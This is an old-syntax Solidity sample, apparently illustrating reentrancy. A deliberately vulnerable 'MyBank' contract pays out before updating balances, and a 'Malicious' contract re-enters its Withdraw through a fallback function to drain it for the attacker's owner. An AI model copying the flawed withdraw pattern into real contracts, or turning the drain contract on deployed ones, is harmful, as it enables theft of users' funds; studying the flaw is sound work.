contract MyBank {
  mapping (address => uint) balances;
  
  function Deposit() {
    balances[msg.sender] += msg.value;
  }

  function Withdraw(uint amount) {
    if(balances[msg.sender] >= amount) {
      msg.sender.call.value(amount)();
      balances[msg.sender] -= amount;
    }
  }

  function Balance() constant returns(uint) {
    return balances[msg.sender];
  }
}

contract Malicious {
  address public owner;
  uint public amount;
  MyBank public bank;

  function Malicious(MyBank _bank) { 
      bank = _bank;
      owner = msg.sender;
  }

  function Drain() {
     amount = msg.value; 
     bank.Deposit.value(amount)();
     bank.Withdraw.value(0)(amount); // forwards remaining gas 
  }
  
  function Claim() {
      owner.send(this.balance);
  }
  
  function () { // fallback function
    if(msg.gas > 50000) bank.Withdraw.value(0)(amount);
  }
}

